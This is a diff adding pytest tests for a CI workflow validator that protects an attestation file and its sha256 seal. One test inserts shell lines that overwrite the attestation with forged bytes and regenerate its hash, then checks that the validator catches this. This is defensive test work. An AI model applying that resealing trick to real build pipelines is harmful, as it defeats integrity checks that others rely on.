+def test_attestation_and_sidecar_cannot_be_resealed_with_forged_bytes() -> None:
+    workflow = _workflow().replace(
+        b'          sha256sum --check "$MCP_ATTESTATION_SHA256"\n',
+        b'          printf forged > "$MCP_ATTESTATION"\n'
+        b'          sha256sum "$MCP_ATTESTATION" > "$MCP_ATTESTATION_SHA256"\n'
+        b'          sha256sum --check "$MCP_ATTESTATION_SHA256"\n',
+        1,
+    )
+
+    with pytest.raises(
+        contract.OfficialConsumerContractError, match="attestation.*rewritten"
+    ):
+        contract.validate_contract("codex", workflow, _test_contract("codex"))
+
+
+def test_attestation_seal_supports_a_split_command_substitution_loader() -> None:
+    workflow = _workflow().replace(
+        b'          EXPECTED_RUNTIME_VERSION="$(python3 - "$CI_ROOT" '
+        b"\"$MCP_ATTESTATION\" <<'PY'\n",
+        b'          EXPECTED_RUNTIME_VERSION="$(\n'
+        b'            python3 - "$CI_ROOT" "$MCP_ATTESTATION" <<\'PY\'\n',
+        1,
+    )
+    assert workflow != _workflow()
+
+    contract.validate_contract("codex", workflow, _test_contract("codex"))
 
 
 def test_attestation_path_cannot_drift_between_generation_and_start() -> None:
